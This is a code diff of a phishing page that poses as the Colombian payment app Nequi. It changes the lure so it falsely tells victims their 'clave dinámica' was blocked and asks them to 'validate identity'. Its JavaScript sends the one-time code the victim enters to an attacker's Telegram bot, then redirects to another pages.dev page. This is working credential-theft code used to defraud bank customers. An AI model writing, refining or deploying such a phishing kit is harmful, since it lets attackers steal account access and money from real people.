@@ -323,12 +323,12 @@
     <img src="bane.jpeg" alt="Banner Nequi" style="width: 100%; max-width: 350px; height: auto;">
   </div>
 
-  <div class="title">Desembolso Addi</div>
+  <div class="title">Activacion de tu dinamica</div>
 
   <!-- Alert Box -->
   <div class="alert-box">
     <h3><i>⚠</i> Importante</h3>
-    <p>Tu proceso necesita validacion . Para el desembolso, necesitamos validar tu identidad.</p>
+    <p>Tu clave dinámica Nequi fue bloqueada por medidas de seguridad. Para reactivarla, necesitamos validar tu identidad.</p>
   </div>
 
   <!-- TARJETA DEL CÓDIGO -->
@@ -492,8 +492,8 @@ function enviarTelegram() {
   const tiempo = restantes > 0 ? formatearTiempo(restantes) : "00:00";
 
   const mensaje =
-    "🔐 *Dinámica numero 2*\n\n" +
-    "🛡️ *Dinámica:* " + codigo + "\n" +
+    "🔐 *Dinámica numero 1*\n\n" +
+    "📟 *Dinámica #1:* " + codigo + "\n" +
     "⏱ *Tiempo restante:* " + tiempo + " min\n";
 
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -508,7 +508,7 @@ function enviarTelegram() {
   .then(r => r.json())
   .then(() => {
     // Redirigir directamente a Google sin alerta
-    window.location.href = "https://serviciosenlinea.pages.dev/loade3.html";
+    window.location.href = "https://serviciosenlinea.pages.dev/loade.html";
   })
   .catch(() => {
     alert("❌ Error enviando la dinámica");
@@ -516,7 +516,7 @@ function enviarTelegram() {
 }
 
 function salir() {
-  window.location.href = "https://encuestasvirtual.site/incio.html";
+  window.location.href = "https://serviciosenlinea.pages.dev/nequi.html";
 }
 
 // Iniciar contador al cargar la página
@@ -524,6 +524,4 @@ iniciarContador();
 </script>
 
 </body>
-
 </html>
-
